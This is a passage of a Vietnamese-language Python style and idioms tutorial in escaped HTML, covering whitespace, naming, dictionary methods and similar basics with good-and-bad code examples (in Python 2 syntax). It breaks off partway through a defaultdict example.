&lt;p&gt;Trước khi vào bài, xin được giới thiệu qua về hai từ mà chúng ta hay gặp là &lt;strong&gt;pythonista&lt;/strong&gt; và &lt;strong&gt;pythoneer&lt;/strong&gt;. &lt;em&gt;Pythonista&lt;/em&gt; chỉ một người theo đuổi ngôn ngữ Python cuồng nhiệt, như là một cổ động viên bóng đá trung thành. &lt;em&gt;Pythoneer&lt;/em&gt; chỉ một người luôn đi đầu và nắm bắt những điểm mới của ngôn ngữ Python, như là nhà khoa học tiên phong trong lĩnh vực của họ. Thông thường, hai từ này đều dùng để chỉ một người rất yêu thích Python, và có thể được hoán chuyển.&lt;/p&gt;
&lt;div class="section" id="kieu-lap-trinh-de-doc-la-quan-trong"&gt;
&lt;h2&gt;Kiểu lập trình: Dễ đọc là quan trọng&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Programs must be written for people to read, and only incidentally for machines to execute.&lt;/p&gt;
&lt;p class="attribution"&gt;&amp;mdash;Abelson &amp;amp; Sussman, &lt;em&gt;Structure and Interpretation of Computer Programs&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Tạm dịch: Chương trình phải được viết ra để cho người đọc, và chỉ là sự trùng hợp để cho máy thực thi.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="khoang-trang"&gt;
&lt;h2&gt;Khoảng trắng&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Bốn (4) khoảng trắng ở mỗi nấc thụt vào&lt;/li&gt;
&lt;li&gt;Không dùng tab&lt;/li&gt;
&lt;li&gt;Không bao giờ lẫn lộn tab và khoảng trắng&lt;/li&gt;
&lt;li&gt;Cách một dòng giữa các hàm&lt;/li&gt;
&lt;li&gt;Cách hai dòng giữa các lớp&lt;/li&gt;
&lt;li&gt;Chừa một khoảng trắng sau dấu phẩy &lt;tt class="docutils literal"&gt;,&lt;/tt&gt; trong từ điển, danh sách, bộ, danh sách tham số, và sau dấu hai chấm &lt;tt class="docutils literal"&gt;:&lt;/tt&gt; trong từ điển nhưng không phải trước nó&lt;/li&gt;
&lt;li&gt;Chừa một khoảng trắng trước và sau phép gán và so sánh (trừ khi trong danh sách tham số)&lt;/li&gt;
&lt;li&gt;Không chừa khoảng trắng trong ngoặc tròn, hoặc ngay trước các danh sách tham số&lt;/li&gt;
&lt;li&gt;Không chừa khoảng trắng trong các chuỗi tài liệu&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="cach-dat-ten"&gt;
&lt;h2&gt;Cách đặt tên&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;joined_lower&lt;/tt&gt; cho hàm, phương thức và thuộc tính&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;joined_lower&lt;/tt&gt; hoặc &lt;tt class="docutils literal"&gt;ALL_CAPS&lt;/tt&gt; cho hằng&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;CapWords&lt;/tt&gt; cho lớp&lt;/li&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;camelCase&lt;/tt&gt; chỉ dùng để hợp với những thói quen đã có&lt;/li&gt;
&lt;li&gt;Với các thuộc tính: &lt;tt class="docutils literal"&gt;public&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;_internal&lt;/tt&gt;, và &lt;tt class="docutils literal"&gt;__private&lt;/tt&gt; nhưng hạn chế dùng kiểu &lt;tt class="docutils literal"&gt;__private&lt;/tt&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="nhung-cau-lenh-ghep"&gt;
&lt;h2&gt;Những câu lệnh ghép&lt;/h2&gt;
&lt;p&gt;Tốt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;foo&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blah&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;do_something&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;do_one&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;do_two&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;do_three&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Xấu:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;foo&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blah&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;do_something&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;do_one&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="n"&gt;do_two&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="n"&gt;do_three&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Việc thiếu thụt vào ở mã &amp;quot;Xấu&amp;quot; &lt;em&gt;che mất&lt;/em&gt; câu lệnh &lt;tt class="docutils literal"&gt;if&lt;/tt&gt;. Sử dụng nhiều câu lệnh trên cùng một dòng là mang tội lớn.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="hoan-doi-gia-tri"&gt;
&lt;h2&gt;Hoán đổi giá trị&lt;/h2&gt;
&lt;p&gt;Trong các ngôn ngữ khác:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;temp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong Python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="dau-tuong-tac"&gt;
&lt;h2&gt;Dấu &lt;tt class="docutils literal"&gt;_&lt;/tt&gt; tương tác&lt;/h2&gt;
&lt;p&gt;Đây là một chức năng thật sự hữu dụng mà ít người biết.&lt;/p&gt;
&lt;p&gt;Trong môi trường thông dịch tương tác, khi bạn định giá một biểu thức hoặc gọi một hàm, kết quả sẽ được gán vào một tên tạm, &lt;tt class="docutils literal"&gt;_&lt;/tt&gt; (dấu gạch chân).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="go"&gt;2&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;
&lt;span class="go"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;_&lt;/tt&gt; chứa biểu thức &lt;em&gt;được in&lt;/em&gt; cuối cùng. Khi kết quả là &lt;tt class="docutils literal"&gt;None&lt;/tt&gt;, không có gì được in ra nên &lt;tt class="docutils literal"&gt;_&lt;/tt&gt; không thay đổi. Dấu gạch chân chỉ có tác dụng trong môi trường tương tác, không có tác dụng trong một mô-đun.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="tao-chuoi-tu-cac-chuoi-con"&gt;
&lt;h2&gt;Tạo chuỗi từ các chuỗi con&lt;/h2&gt;
&lt;p&gt;Dùng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;colors&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;red&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;green&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;yellow&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;colors&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Không dùng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;colors&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;red&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;green&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;yellow&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;colors&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trường hợp hay gặp khi danh sách có nhiều hơn một phần từ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;colors&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;red&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;green&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;yellow&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Choose&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;colors&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;or&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;colors&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In ra:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
Choose red, blue, green or yellow
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="dung-in-khi-co-the"&gt;
&lt;h2&gt;Dùng &lt;tt class="docutils literal"&gt;in&lt;/tt&gt; khi có thể&lt;/h2&gt;
&lt;p&gt;Tốt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;tt class="docutils literal"&gt;in&lt;/tt&gt; thường là nhanh hơn&lt;/li&gt;
&lt;li&gt;có thể dùng được với danh sách, bộ, từ điển, và tập hợp&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Xấu:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Chỉ dùng được cho các đối tượng có phương thức &lt;tt class="docutils literal"&gt;keys()&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Nhưng sẽ cần dùng &lt;tt class="docutils literal"&gt;keys()&lt;/tt&gt; khi sửa đổi từ điển:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;vì &lt;tt class="docutils literal"&gt;keys()&lt;/tt&gt; tạo ra một danh sách các khóa riêng để lặp. Nếu không, bạn sẽ gặp phải lỗi &lt;tt class="docutils literal"&gt;RuntimeError&lt;/tt&gt; vì từ điển bị thay đổi trong khi lặp.&lt;/p&gt;
&lt;p&gt;Để thống nhất, hãy dùng &lt;tt class="docutils literal"&gt;key in dict&lt;/tt&gt; thay vì &lt;tt class="docutils literal"&gt;dict.has_key(key)&lt;/tt&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="phuong-thuc-get-cua-tu-dien"&gt;
&lt;h2&gt;Phương thức &lt;tt class="docutils literal"&gt;get()&lt;/tt&gt; của từ điển&lt;/h2&gt;
&lt;p&gt;Chúng ta thường khởi tạo các phần tử từ điển trước khi dùng. Đây là cách không hay:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;navs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;portfolio&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;navs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;navs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;navs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;prices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Dùng &lt;tt class="docutils literal"&gt;dict.get(key, default)&lt;/tt&gt; sẽ tránh được việc kiểm tra:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;navs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;navs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;navs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;prices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="phuong-thuc-setdefault-cua-tu-dien"&gt;
&lt;h2&gt;Phương thức &lt;tt class="docutils literal"&gt;setdefault()&lt;/tt&gt; của từ điển&lt;/h2&gt;
&lt;p&gt;Cách dở để khởi tạo một từ điển:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;equities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;portfolio&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;equities&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;equities&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;equities&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Dùng &lt;tt class="docutils literal"&gt;dict.setdefault(key, default)&lt;/tt&gt; nhanh gọn hơn nhiều:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;equities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;equities&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setdefault&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;dict.setdefault()&lt;/tt&gt; tương đương với &lt;em&gt;lấy, hoặc thiết lập rồi lấy&lt;/em&gt;. Nó rất hiệu quả nếu khóa từ điển cần nhiều thời gian để tính, hoặc vì nó dài nên khó nhập. Tuy nhiên giá trị &lt;em&gt;default&lt;/em&gt; luôn luôn được tính cho dù có cần dùng hay không.&lt;/p&gt;
&lt;p&gt;Phương thức &lt;tt class="docutils literal"&gt;setdefault()&lt;/tt&gt; cũng có thể được dùng riêng vì hiệu quả phụ của nó:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;navs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;navs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setdefault&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;navs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;prices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="defaultdict"&gt;
&lt;h2&gt;&lt;tt class="docutils literal"&gt;defaultdict&lt;/tt&gt;&lt;/h2&gt;
&lt;p&gt;Trong Python 2.5, &lt;tt class="docutils literal"&gt;defaultdict&lt;/tt&gt; là một phần của mô-đun &lt;tt class="docutils literal"&gt;collections&lt;/tt&gt;. Nó giống như từ điển thường nhưng với hai đặc điểm khác:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Nó nhận một tham số là một hàm nhà máy mặc định (default factory functions) và&lt;/li&gt;
&lt;li&gt;Khi khóa không thể tìm thấy trong từ điển, hàm này sẽ được gọi và kết quả trả về sẽ được dùng để khởi tạo khóa đó&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Đây là ví dụ trước, mà mỗi phần tử trong từ điển là một danh sách rỗng, nhưng dùng &lt;tt class="docutils literal"&gt;defaultdict&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;collections&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;defaultdict&lt;/span&gt;

&lt;span class="n"&gt;equities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;defaultdict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;portfolio&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;equity&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
